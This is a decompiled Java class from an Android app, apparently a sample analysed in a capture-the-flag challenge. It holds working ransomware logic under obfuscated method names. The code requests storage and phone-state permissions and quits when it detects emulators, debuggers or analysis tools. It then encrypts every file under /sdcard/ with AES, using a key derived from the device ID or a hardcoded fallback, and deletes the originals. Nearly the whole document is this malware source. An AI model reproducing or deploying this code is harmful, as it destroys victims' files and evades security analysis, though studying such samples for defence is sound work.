package com.dfwgxc.zimcdwpealgy;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.dfwgxc.zimcdwpealgy.debugger.FindDebugger;
import com.dfwgxc.zimcdwpealgy.emulator.FindEmulator;
import com.dfwgxc.zimcdwpealgy.monkey.FindMonkey;
import com.dfwgxc.zimcdwpealgy.taint.FindTaint;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.math.BigInteger;
import java.security.AlgorithmParameters;
import java.security.Key;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Iterator;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class PkdGTfG
  extends Activity
{
  public static String HIUHuihqfdiuhIUQWHDUIhgfi1278e412y78yDASVBDUYvwq(String paramString)
  {
    Object localObject = null;
    try
    {
      MessageDigest localMessageDigest = MessageDigest.getInstance("MD5");
      localObject = localMessageDigest;
    }
    catch (NoSuchAlgorithmException localNoSuchAlgorithmException)
    {
      for (;;)
      {
        localNoSuchAlgorithmException.printStackTrace();
      }
    }
    ((MessageDigest)localObject).update(paramString.getBytes(), 0, paramString.length());
    return new BigInteger(1, ((MessageDigest)localObject).digest()).toString(16);
  }
  
  private void UIHiuhLIUHIHFiuhIUWEFHi8uh23l78ry78hfguisdh(String paramString1, String paramString2)
    throws Exception
  {
    Object localObject1 = new FileInputStream(paramString2.substring(0, paramString2.length() - 4) + ".iurehgilueraswhgl854y9gqw8u45rghotjhl54jh985yhjtrshstrghuy3tkgq8343hgh54");
    Object localObject2 = new byte[8];
    ((FileInputStream)localObject1).read((byte[])localObject2);
    ((FileInputStream)localObject1).close();
    Object localObject3 = new FileInputStream(paramString2.substring(0, paramString2.length() - 4) + ".iv");
    localObject1 = new byte[16];
    ((FileInputStream)localObject3).read((byte[])localObject1);
    ((FileInputStream)localObject3).close();
    localObject2 = new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(paramString1.toCharArray(), (byte[])localObject2, 65536, 256)).getEncoded(), "AES");
    paramString1 = Cipher.getInstance("AES/CBC/PKCS5Padding");
    paramString1.init(2, (Key)localObject2, new IvParameterSpec((byte[])localObject1));
    localObject1 = new FileInputStream(paramString2);
    paramString2 = new FileOutputStream(paramString2 + ".decrypted");
    localObject2 = new byte[64];
    for (;;)
    {
      int i = ((FileInputStream)localObject1).read((byte[])localObject2);
      if (i == -1) {
        break;
      }
      localObject3 = paramString1.update((byte[])localObject2, 0, i);
      if (localObject3 != null) {
        paramString2.write((byte[])localObject3);
      }
    }
    paramString1 = paramString1.doFinal();
    if (paramString1 != null) {
      paramString2.write(paramString1);
    }
    ((FileInputStream)localObject1).close();
    paramString2.flush();
    paramString2.close();
  }
  
  private void agaierughl8y3g98ersiugohserkihgoas8erg89(String paramString1, String paramString2)
    throws Exception
  {
    FileInputStream localFileInputStream = new FileInputStream(paramString2);
    FileOutputStream localFileOutputStream = new FileOutputStream(paramString2 + ".xxx");
    Object localObject1 = new byte[8];
    new SecureRandom().nextBytes((byte[])localObject1);
    Object localObject2 = new FileOutputStream(paramString2 + ".salt");
    ((FileOutputStream)localObject2).write((byte[])localObject1);
    ((FileOutputStream)localObject2).close();
    localObject1 = new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(paramString1.toCharArray(), (byte[])localObject1, 65536, 256)).getEncoded(), "AES");
    paramString1 = Cipher.getInstance("AES/CBC/PKCS5Padding");
    paramString1.init(1, (Key)localObject1);
    localObject1 = paramString1.getParameters();
    localObject2 = new FileOutputStream(paramString2 + ".iv");
    ((FileOutputStream)localObject2).write(((IvParameterSpec)((AlgorithmParameters)localObject1).getParameterSpec(IvParameterSpec.class)).getIV());
    ((FileOutputStream)localObject2).close();
    localObject1 = new byte[64];
    for (;;)
    {
      int i = localFileInputStream.read((byte[])localObject1);
      if (i == -1) {
        break;
      }
      localObject2 = paramString1.update((byte[])localObject1, 0, i);
      if (localObject2 != null) {
        localFileOutputStream.write((byte[])localObject2);
      }
    }
    paramString1 = paramString1.doFinal();
    if (paramString1 != null) {
      localFileOutputStream.write(paramString1);
    }
    localFileInputStream.close();
    localFileOutputStream.flush();
    localFileOutputStream.close();
    DeleteFile(paramString2);
  }
  
  public static void gseriughilu43hgl8y43qlut8g9weu4yghrtbionfiuo4hgt(String paramString, ArrayList<String> paramArrayList)
  {
    paramString = new File(paramString).listFiles();
    if (paramString != null)
    {
      int j = paramString.length;
      int i = 0;
      if (i < j)
      {
        Object localObject = paramString[i];
        if (((File)localObject).isDirectory()) {
          gseriughilu43hgl8y43qlut8g9weu4yghrtbionfiuo4hgt(((File)localObject).getAbsolutePath(), paramArrayList);
        }
        for (;;)
        {
          i += 1;
          break;
          paramArrayList.add(((File)localObject).getAbsolutePath());
        }
      }
    }
  }
  
  public void DeleteFile(String paramString)
  {
    new File(paramString).delete();
  }
  
  public void faweifunhiunfg2uylbh8634gh783ghinegkrjln18hi8123()
    throws Exception
  {
    Object localObject = new ArrayList();
    gseriughilu43hgl8y43qlut8g9weu4yghrtbionfiuo4hgt("/sdcard/", (ArrayList)localObject);
    localObject = ((ArrayList)localObject).iterator();
    while (((Iterator)localObject).hasNext())
    {
      String str = (String)((Iterator)localObject).next();
      if ((!str.endsWith(".xxx")) && (!str.endsWith(".salt")) && (!str.endsWith(".iv"))) {
        agaierughl8y3g98ersiugohserkihgoas8erg89(faweifunhiunfg2uylbh8734gh778ghinegkrGln18hi8123(this), str);
      }
    }
  }
  
  public String faweifunhiunfg2uylbh8734gh778ghinegkrGln18hi8123(Context paramContext)
  {
    if (ContextCompat.checkSelfPermission(this, "android.permission.READ_PHONE_STATE") == 0) {
      return HIUHuihqfdiuhIUQWHDUIhgfi1278e412y78yDASVBDUYvwq(((TelephonyManager)paramContext.getSystemService("phone")).getDeviceId());
    }
    return HIUHuihqfdiuhIUQWHDUIhgfi1278e412y78yDASVBDUYvwq("e21833235b6eef10");
  }
  
  public void gesrguilsneriugneruilghl8yf873l4yf8hguihreiughsilgerg()
  {
    finish();
    System.exit(0);
  }
  
  public boolean gsegeruigh983hj9g8ruegliurhiguhui23hfgqylg93qg()
  {
    return FindMonkey.isUserAMonkey();
  }
  
  public void gsergierhgiuserhguih34l87hg78ywg87yhreiughiluserhglbiuntsbiks()
  {
    if ((hwieufhiulerhfg87ay34fyahfluiehg7uer()) || (hysdbgfguyaebfguyrgb7yu234rtwekfuybsdhdqwudgyuy3wgd76k1gdk7g()) || (gsegeruigh983hj9g8ruegliurhiguhui23hfgqylg93qg()) || (uierghiuearshgiuerhguiaehrgl7834ylflq3erg())) {
      gesrguilsneriugneruilghl8yf873l4yf8hguihreiughsilgerg();
    }
  }
  
  public boolean hwieufhiulerhfg87ay34fyahfluiehg7uer()
  {
    return (FindEmulator.hasKnownDeviceId(getApplicationContext())) || (FindEmulator.hasKnownImsi(getApplicationContext())) || (FindEmulator.hasEmulatorBuild(getApplicationContext())) || (FindEmulator.hasKnownPhoneNumber(getApplicationContext())) || (FindEmulator.hasPipes()) || (FindEmulator.hasQEmuDrivers()) || (FindEmulator.hasEmulatorAdb()) || (FindEmulator.hasQEmuFiles()) || (FindEmulator.hasGenyFiles());
  }
  
  public void hysdbgfguyaebfguyrgb7iu234rtwekfubsdhdqwudgyuy3wgd76k1gdk7g(String paramString)
  {
    Log.d("Task:", paramString);
  }
  
  public boolean hysdbgfguyaebfguyrgb7yu234rtwekfuybsdhdqwudgyuy3wgd76k1gdk7g()
  {
    int i = 0;
    try
    {
      boolean bool = FindDebugger.hasTracerPid();
      i = bool;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
    }
    return (FindDebugger.isBeingDebugged()) || (i != 0);
  }
  
  public void iogheruighaeuirghaiueghbxcvbkjnsbkvjengkjnUYFegw12312sdiufgehari()
  {
    int i;
    int j;
    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, "android.permission.READ_EXTERNAL_STORAGE"))
    {
      i = 1;
      if (ActivityCompat.shouldShowRequestPermissionRationale(this, "android.permission.WRITE_EXTERNAL_STORAGE")) {
        break label75;
      }
      j = 1;
      label24:
      if (ActivityCompat.shouldShowRequestPermissionRationale(this, "android.permission.READ_PHONE_STATE")) {
        break label80;
      }
    }
    label75:
    label80:
    for (int k = 1;; k = 0)
    {
      if ((k | j | i) != 0) {
        ActivityCompat.requestPermissions(this, new String[] { "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_PHONE_STATE" }, 1);
      }
      return;
      i = 0;
      break;
      j = 0;
      break label24;
    }
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    if ((ContextCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") != 0) && (ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") != 0) && (ContextCompat.checkSelfPermission(this, "android.permission.READ_PHONE_STATE") != 0)) {
      iogheruighaeuirghaiueghbxcvbkjnsbkvjengkjnUYFegw12312sdiufgehari();
    }
    gsergierhgiuserhguih34l87hg78ywg87yhreiughiluserhglbiuntsbiks();
    new Thread()
    {
      public void run()
      {
        super.run();
        PkdGTfG.this.gsergierhgiuserhguih34l87hg78ywg87yhreiughiluserhglbiuntsbiks();
      }
    }.start();
    try
    {
      faweifunhiunfg2uylbh8634gh783ghinegkrjln18hi8123();
      return;
    }
    catch (Exception paramBundle)
    {
      hysdbgfguyaebfguyrgb7iu234rtwekfubsdhdqwudgyuy3wgd76k1gdk7g(paramBundle.toString());
    }
  }
  
  public boolean uierghiuearshgiuerhguiaehrgl7834ylflq3erg()
  {
    return (FindTaint.hasAppAnalysisPackage(this)) || (FindTaint.hasTaintClass()) || (FindTaint.hasTaintMemberVariables());
  }
}


/* Location:              /home/eybisi/workspace/CTF/Bizone/apps/com.dfwgxc.zimcdwpealgy/r/app_files/oat/arm64/muquieljmg.apk_classes-dex2jar.jar!/com/dfwgxc/zimcdwpealgy/PkdGTfG.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */